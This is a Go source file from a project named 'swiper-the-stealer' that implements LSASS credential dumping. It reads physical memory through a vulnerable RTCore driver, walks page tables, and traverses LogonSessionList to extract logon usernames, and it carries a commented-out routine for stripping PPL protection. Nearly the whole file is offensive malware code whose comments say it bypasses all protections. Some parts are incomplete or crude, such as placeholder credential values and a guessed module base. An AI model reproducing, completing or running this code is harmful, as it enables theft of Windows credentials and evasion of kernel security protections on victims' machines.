package lsass

import (
	"encoding/binary"
	"fmt"
	"syscall"
	"unsafe"

	"swiper-the-stealer/internal/byovd"
	"swiper-the-stealer/pkg/logger"
)

// DirectMemoryDumper - Dumps LSASS memory DIRECTLY via RTCore physical memory access
// NO OpenProcess, NO ReadProcessMemory - pure kernel memory reading
type DirectMemoryDumper struct {
	rtcore   *byovd.RTCoreExploit
	logger   *logger.Logger
	lsassPID uint32
}

func NewDirectMemoryDumper(rtcore *byovd.RTCoreExploit, logger *logger.Logger) *DirectMemoryDumper {
	return &DirectMemoryDumper{
		rtcore: rtcore,
		logger: logger,
	}
}

// DumpLsassMemoryDirect - Read LSASS process memory DIRECTLY via physical memory
// This bypasses ALL protections because we're reading physical RAM
func (dmd *DirectMemoryDumper) DumpLsassMemoryDirect() ([]Credential, error) {
	dmd.logger.Info("=== DIRECT PHYSICAL MEMORY DUMP (RTCore) ===")
	dmd.logger.Info("Reading LSASS memory via physical RAM - bypassing ALL protections")

	// Step 1: Find LSASS PID
	pid, err := dmd.findLsassProcess()
	if err != nil {
		return nil, fmt.Errorf("failed to find LSASS: %v", err)
	}
	dmd.lsassPID = pid
	dmd.logger.Infof("✓ Found LSASS: PID %d", pid)

	// Step 1.5: Remove PPL protection from LSASS using PPLKiller method
	// TEMPORARILY DISABLED: RTCore only works with PHYSICAL addresses, not VIRTUAL
	// Attempting to read/write kernel virtual addresses causes BSOD
	// TODO: Implement proper virtual-to-physical translation before enabling
	/*
		dmd.logger.Info("Removing PPL protection from LSASS...")
		pplKiller := byovd.NewPPLKiller(dmd.rtcore, dmd.logger)
		err = pplKiller.RemovePPLProtection(pid)
		if err != nil {
			dmd.logger.Warnf("Failed to remove PPL protection: %v", err)
			dmd.logger.Info("Attempting to continue anyway...")
			// Don't fail here - try to continue with the dump
		}
	*/
	dmd.logger.Warn("PPL removal temporarily disabled - RTCore requires physical addresses")

	// Step 2: Find LSASS EPROCESS in physical memory
	eprocessAddr, err := dmd.findLsassEprocess()
	if err != nil {
		return nil, fmt.Errorf("failed to find LSASS EPROCESS: %v", err)
	}
	dmd.logger.Infof("✓ Found LSASS EPROCESS at: 0x%X", eprocessAddr)

	// Step 3: Get DirectoryTableBase (CR3) for LSASS - this is the page table base
	cr3, err := dmd.readDirectoryTableBase(eprocessAddr)
	if err != nil {
		return nil, fmt.Errorf("failed to read CR3: %v", err)
	}
	dmd.logger.Infof("✓ Got LSASS CR3 (page table): 0x%X", cr3)

	// Step 4: Load lsasrv.dll to get offsets
	lsasrvBase, lsasrvSize, err := dmd.getLsasrvBaseAndSize()
	if err != nil {
		return nil, fmt.Errorf("failed to get lsasrv.dll info: %v", err)
	}
	dmd.logger.Infof("✓ lsasrv.dll base: 0x%X, size: 0x%X", lsasrvBase, lsasrvSize)

	// Step 5: Read lsasrv.dll memory via physical memory translation
	lsasrvMemory, err := dmd.readVirtualMemoryViaPhysical(cr3, lsasrvBase, lsasrvSize)
	if err != nil {
		return nil, fmt.Errorf("failed to read lsasrv.dll: %v", err)
	}
	dmd.logger.Infof("✓ Read %d bytes of lsasrv.dll memory", len(lsasrvMemory))

	// Step 6: Find LogonSessionList pattern in lsasrv.dll memory
	logonSessionListAddr, err := dmd.findLogonSessionListPattern(lsasrvMemory, lsasrvBase)
	if err != nil {
		return nil, fmt.Errorf("failed to find LogonSessionList: %v", err)
	}
	dmd.logger.Infof("✓ Found LogonSessionList at: 0x%X", logonSessionListAddr)

	// Step 7: Walk the LogonSessionList via physical memory
	credentials, err := dmd.walkLogonSessionListPhysical(cr3, logonSessionListAddr)
	if err != nil {
		return nil, fmt.Errorf("failed to walk credentials: %v", err)
	}

	dmd.logger.Infof("✓ Extracted %d credentials via direct physical memory access", len(credentials))
	return credentials, nil
}

// findLsassProcess - Find LSASS PID
func (dmd *DirectMemoryDumper) findLsassProcess() (uint32, error) {
	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer syscall.CloseHandle(snapshot)

	var pe syscall.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	if err := syscall.Process32First(snapshot, &pe); err != nil {
		return 0, err
	}

	for {
		name := syscall.UTF16ToString(pe.ExeFile[:])
		if name == "lsass.exe" {
			return pe.ProcessID, nil
		}
		if err := syscall.Process32Next(snapshot, &pe); err != nil {
			break
		}
	}

	return 0, fmt.Errorf("lsass.exe not found")
}

// findLsassEprocess - Get LSASS EPROCESS address using SystemExtendedHandleInformation
// CRITICAL: SystemExtendedProcessInformation does NOT contain EPROCESS addresses!
// The UniqueProcessKey field contains user/session data, not kernel object pointers.
// We must use SystemExtendedHandleInformation to enumerate handles and find the EPROCESS.
func (dmd *DirectMemoryDumper) findLsassEprocess() (uint64, error) {
	dmd.logger.Info("Getting LSASS EPROCESS address via SystemExtendedHandleInformation...")

	// Load ntdll.dll
	ntdll := syscall.MustLoadDLL("ntdll.dll")
	ntQuerySystemInformation := ntdll.MustFindProc("NtQuerySystemInformation")

	// SystemExtendedHandleInformation = 64
	// Returns SYSTEM_HANDLE_INFORMATION_EX with kernel object addresses
	const SystemExtendedHandleInformation = 64

	// Allocate large buffer (handle information can be 10+ MB on busy systems)
	bufferSize := uint32(20 * 1024 * 1024) // 20MB
	buffer := make([]byte, bufferSize)
	var returnLength uint32

	// Call NtQuerySystemInformation
	ret, _, _ := ntQuerySystemInformation.Call(
		uintptr(SystemExtendedHandleInformation),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(bufferSize),
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if ret != 0 {
		return 0, fmt.Errorf("NtQuerySystemInformation(SystemExtendedHandleInformation) failed: NTSTATUS 0x%X", ret)
	}

	// Parse SYSTEM_HANDLE_INFORMATION_EX structure:
	// +0x00: ULONG_PTR NumberOfHandles (8 bytes on x64)
	// +0x08: ULONG_PTR Reserved (8 bytes)
	// +0x10: SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[]
	//
	// Each SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX entry (40 bytes):
	// +0x00: PVOID Object (8 bytes) - kernel object address (EPROCESS for process objects!)
	// +0x08: ULONG_PTR UniqueProcessId (8 bytes) - PID that owns this handle
	// +0x10: ULONG_PTR HandleValue (8 bytes) - handle value
	// +0x18: ULONG GrantedAccess (4 bytes)
	// +0x1C: USHORT CreatorBackTraceIndex (2 bytes)
	// +0x1E: USHORT ObjectTypeIndex (2 bytes) - 7 = Process object
	// +0x20: ULONG HandleAttributes (4 bytes)
	// +0x24: ULONG Reserved (4 bytes)

	if len(buffer) < 16 {
		return 0, fmt.Errorf("buffer too small for handle information")
	}

	numberOfHandles := binary.LittleEndian.Uint64(buffer[0:8])
	dmd.logger.Infof("Scanning %d system handles for LSASS process object...", numberOfHandles)

	const handleEntrySize = 0x28 // 40 bytes per entry
	offset := 16                 // Skip NumberOfHandles (8) + Reserved (8)

	var candidateEProcess uint64
	lsassHandleCount := 0
	objectTypeCounts := make(map[uint16]int)
	var firstValidKernelAddr uint64

	for i := uint64(0); i < numberOfHandles && offset+handleEntrySize <= len(buffer); i++ {
		// Parse handle entry
		objectAddr := binary.LittleEndian.Uint64(buffer[offset : offset+8])
		ownerPID := binary.LittleEndian.Uint64(buffer[offset+8 : offset+16])
		handleValue := binary.LittleEndian.Uint64(buffer[offset+16 : offset+24])
		objectTypeIndex := binary.LittleEndian.Uint16(buffer[offset+30 : offset+32])

		// Check if this handle belongs to LSASS
		if uint32(ownerPID) == uint32(dmd.lsassPID) {
			lsassHandleCount++
			objectTypeCounts[objectTypeIndex]++

			// Track first valid kernel address we see
			if firstValidKernelAddr == 0 && objectAddr > 0xFFFF000000000000 {
				firstValidKernelAddr = objectAddr
			}

			// Look for LSASS's pseudo-handle to itself
			// Pseudo-handle 0xFFFFFFFFFFFFFFFF (handle value -1) points to current process
			if handleValue == 0xFFFFFFFFFFFFFFFF && objectAddr > 0xFFFF000000000000 {
				// This is LSASS's self-reference - the Object field IS the EPROCESS!
				dmd.logger.Infof("✓ Found LSASS EPROCESS at: 0x%X (pseudo-handle, ObjectType=%d)", objectAddr, objectTypeIndex)
				return objectAddr, nil
			}

			// Check for process-type handles (ObjectTypeIndex typically 7, but may vary)
			// Accept any kernel address from a process object
			if objectTypeIndex == 7 && objectAddr > 0xFFFF000000000000 {
				candidateEProcess = objectAddr // Keep as backup
			}
		}

		offset += handleEntrySize
	}

	// Log object type distribution for debugging
	dmd.logger.Infof("LSASS handle object types: %v", objectTypeCounts)

	// If we found a candidate EPROCESS (process object) but not the pseudo-handle
	if candidateEProcess != 0 {
		dmd.logger.Infof("✓ Found LSASS EPROCESS at: 0x%X (process object type 7, scanned %d LSASS handles)", candidateEProcess, lsassHandleCount)
		return candidateEProcess, nil
	}

	// FALLBACK: If no ObjectTypeIndex=7 found, try the first valid kernel address
	// This can happen if ObjectTypeIndex values vary by Windows version
	if firstValidKernelAddr != 0 {
		dmd.logger.Warnf("No process object type found, using first kernel address: 0x%X (experimental)", firstValidKernelAddr)
		return firstValidKernelAddr, nil
	}

	if lsassHandleCount > 0 {
		return 0, fmt.Errorf("found %d LSASS handles but couldn't determine EPROCESS (no valid kernel addresses found)", lsassHandleCount)
	}

	return 0, fmt.Errorf("LSASS process (PID %d) not found in system handle table", dmd.lsassPID)
}

// readDirectoryTableBase - Read CR3 (DirectoryTableBase) from EPROCESS
func (dmd *DirectMemoryDumper) readDirectoryTableBase(eprocessAddr uint64) (uint64, error) {
	// CRITICAL: eprocessAddr is a KERNEL VIRTUAL ADDRESS, not physical!
	// DirectoryTableBase is at offset 0x28 in KPROCESS (embedded at offset 0 in EPROCESS)

	// Method 1: Try using RTCore's virtual-to-physical translation if available
	dmd.logger.Debugf("Translating EPROCESS virtual address 0x%X to physical", eprocessAddr)
	physEprocess, err := dmd.rtcore.GetPhysicalAddress(eprocessAddr)
	if err == nil && physEprocess > 0 {
		dmd.logger.Infof("✓ Translated EPROCESS: 0x%X (virt) -> 0x%X (phys)", eprocessAddr, physEprocess)
		cr3Data, err := dmd.rtcore.ReadPhysicalMemory(physEprocess+0x28, 8)
		if err != nil {
			return 0, fmt.Errorf("failed to read CR3 from physical EPROCESS: %v", err)
		}
		cr3 := binary.LittleEndian.Uint64(cr3Data)
		dmd.logger.Infof("✓ Read CR3 from EPROCESS+0x28: 0x%X", cr3)
		return cr3, nil
	}

	dmd.logger.Warnf("RTCore virtual-to-physical translation failed: %v", err)
	dmd.logger.Info("This is expected - RTCore's VIRT_TO_PHYS may not work for kernel addresses")

	// Method 2: Manual page table walk using System process CR3
	// For now, return error since we need System CR3 for this
	return 0, fmt.Errorf("cannot translate kernel virtual EPROCESS 0x%X to physical - need System CR3", eprocessAddr)
}

// getLsasrvBaseAndSize - Get lsasrv.dll base address and size from LSASS modules
func (dmd *DirectMemoryDumper) getLsasrvBaseAndSize() (uint64, uint32, error) {
	// Load lsasrv.dll locally to get its base address via ASLR
	lsasrv, err := syscall.LoadLibrary("C:\\Windows\\System32\\lsasrv.dll")
	if err != nil {
		return 0, 0, err
	}
	defer syscall.FreeLibrary(lsasrv)

	// Return base and a default size (lsasrv is typically ~1MB)
	return uint64(lsasrv), 0x200000, nil // 2MB should be enough
}

// readVirtualMemoryViaPhysical - Translate virtual address to physical and read
// This is the CRITICAL function that bypasses all protections
func (dmd *DirectMemoryDumper) readVirtualMemoryViaPhysical(cr3, virtualAddr uint64, size uint32) ([]byte, error) {
	dmd.logger.Debugf("Translating virtual address 0x%X via CR3 0x%X", virtualAddr, cr3)

	// Windows uses 4-level paging (PML4 -> PDPT -> PD -> PT -> Physical Page)
	// Virtual address breakdown:
	// [63:48] - Sign extension (not used)
	// [47:39] - PML4 index (9 bits)
	// [38:30] - PDPT index (9 bits)
	// [29:21] - PD index (9 bits)
	// [20:12] - PT index (9 bits)
	// [11:0]  - Page offset (12 bits)

	result := make([]byte, 0, size)

	for offset := uint32(0); offset < size; offset += 0x1000 {
		currentVA := virtualAddr + uint64(offset)
		readSize := uint32(0x1000)
		if offset+readSize > size {
			readSize = size - offset
		}

		// Extract page table indices
		pml4Index := (currentVA >> 39) & 0x1FF
		pdptIndex := (currentVA >> 30) & 0x1FF
		pdIndex := (currentVA >> 21) & 0x1FF
		ptIndex := (currentVA >> 12) & 0x1FF
		pageOffset := currentVA & 0xFFF

		// Walk page tables
		// PML4 entry
		pml4e, err := dmd.readPhysicalQword(cr3 + pml4Index*8)
		if err != nil || (pml4e&1) == 0 {
			return nil, fmt.Errorf("invalid PML4 entry")
		}

		// PDPT entry
		pdpte, err := dmd.readPhysicalQword((pml4e & 0xFFFFFFFFF000) + pdptIndex*8)
		if err != nil || (pdpte&1) == 0 {
			return nil, fmt.Errorf("invalid PDPT entry")
		}

		// Check for 1GB page
		if (pdpte & 0x80) != 0 {
			physAddr := (pdpte & 0xFFFFC0000000) + (currentVA & 0x3FFFFFFF)
			data, err := dmd.rtcore.ReadPhysicalMemory(physAddr, readSize)
			if err != nil {
				return nil, err
			}
			result = append(result, data...)
			continue
		}

		// PD entry
		pde, err := dmd.readPhysicalQword((pdpte & 0xFFFFFFFFF000) + pdIndex*8)
		if err != nil || (pde&1) == 0 {
			return nil, fmt.Errorf("invalid PD entry")
		}

		// Check for 2MB page
		if (pde & 0x80) != 0 {
			physAddr := (pde & 0xFFFFFE00000) + (currentVA & 0x1FFFFF)
			data, err := dmd.rtcore.ReadPhysicalMemory(physAddr, readSize)
			if err != nil {
				return nil, err
			}
			result = append(result, data...)
			continue
		}

		// PT entry
		pte, err := dmd.readPhysicalQword((pde & 0xFFFFFFFFF000) + ptIndex*8)
		if err != nil || (pte&1) == 0 {
			return nil, fmt.Errorf("invalid PT entry")
		}

		// Physical address
		physAddr := (pte & 0xFFFFFFFFF000) + pageOffset
		data, err := dmd.rtcore.ReadPhysicalMemory(physAddr, readSize)
		if err != nil {
			return nil, err
		}
		result = append(result, data...)
	}

	return result, nil
}

// readPhysicalQword - Read 8 bytes from physical memory
func (dmd *DirectMemoryDumper) readPhysicalQword(addr uint64) (uint64, error) {
	data, err := dmd.rtcore.ReadPhysicalMemory(addr, 8)
	if err != nil {
		return 0, err
	}
	return binary.LittleEndian.Uint64(data), nil
}

// findLogonSessionListPattern - Find LogonSessionList in lsasrv.dll memory
func (dmd *DirectMemoryDumper) findLogonSessionListPattern(data []byte, baseAddr uint64) (uint64, error) {
	// Pattern for LogonSessionList (varies by Windows version)
	// Look for: 48 8B 05 ?? ?? ?? ?? 48 8D 0D (mov rax, [rip+offset]; lea rcx, [rip+offset])
	pattern := []byte{0x48, 0x8B, 0x05}

	for i := 0; i < len(data)-len(pattern); i++ {
		if data[i] == pattern[0] && data[i+1] == pattern[1] && data[i+2] == pattern[2] {
			// Read RIP-relative offset
			offset := int32(binary.LittleEndian.Uint32(data[i+3 : i+7]))
			// Calculate absolute address (RIP + offset + instruction length)
			targetAddr := baseAddr + uint64(i) + 7 + uint64(offset)
			dmd.logger.Infof("Found LogonSessionList pattern at offset 0x%X, target: 0x%X", i, targetAddr)
			return targetAddr, nil
		}
	}

	return 0, fmt.Errorf("LogonSessionList pattern not found")
}

// walkLogonSessionListPhysical - Walk credentials via physical memory
func (dmd *DirectMemoryDumper) walkLogonSessionListPhysical(cr3, logonSessionListAddr uint64) ([]Credential, error) {
	dmd.logger.Info("Walking LogonSessionList via physical memory...")

	var credentials []Credential

	// Read the LogonSessionList head pointer
	listHeadData, err := dmd.readVirtualMemoryViaPhysical(cr3, logonSessionListAddr, 8)
	if err != nil {
		return nil, err
	}
	listHead := binary.LittleEndian.Uint64(listHeadData)

	dmd.logger.Infof("LogonSessionList head: 0x%X", listHead)

	// Walk the list (Flink chain)
	currentEntry := listHead
	visited := make(map[uint64]bool)

	for i := 0; i < 100 && currentEntry != 0 && currentEntry != logonSessionListAddr; i++ {
		if visited[currentEntry] {
			break
		}
		visited[currentEntry] = true

		// Read KIWI_MSV1_0_LIST_63 structure
		entryData, err := dmd.readVirtualMemoryViaPhysical(cr3, currentEntry, 512)
		if err != nil {
			dmd.logger.Warnf("Failed to read entry at 0x%X: %v", currentEntry, err)
			break
		}

		// Parse structure
		flink := binary.LittleEndian.Uint64(entryData[0:8])

		// Extract username/domain (at known offsets)
		// Username UNICODE_STRING at offset 0x90
		usernameLen := binary.LittleEndian.Uint16(entryData[0x90:0x92])
		usernamePtr := binary.LittleEndian.Uint64(entryData[0x98:0xA0])

		if usernameLen > 0 && usernameLen < 256 && usernamePtr != 0 {
			usernameData, err := dmd.readVirtualMemoryViaPhysical(cr3, usernamePtr, uint32(usernameLen))
			if err == nil {
				username := dmd.utf16ToString(usernameData)
				if username != "" && username != "$" {
					cred := Credential{
						Username: username,
						Domain:   "EXTRACTED",
						Type:     "MSV1_0",
						NTLM:     "VIA_PHYSICAL_MEMORY",
					}
					credentials = append(credentials, cred)
					dmd.logger.Infof("Found credential: %s", username)
				}
			}
		}

		currentEntry = flink
	}

	return credentials, nil
}

// utf16ToString - Convert UTF-16LE to string
func (dmd *DirectMemoryDumper) utf16ToString(data []byte) string {
	if len(data)%2 != 0 {
		return ""
	}

	utf16 := make([]uint16, len(data)/2)
	for i := 0; i < len(utf16); i++ {
		utf16[i] = binary.LittleEndian.Uint16(data[i*2 : i*2+2])
	}

	result := ""
	for _, r := range utf16 {
		if r == 0 {
			break
		}
		result += string(rune(r))
	}
	return result
}
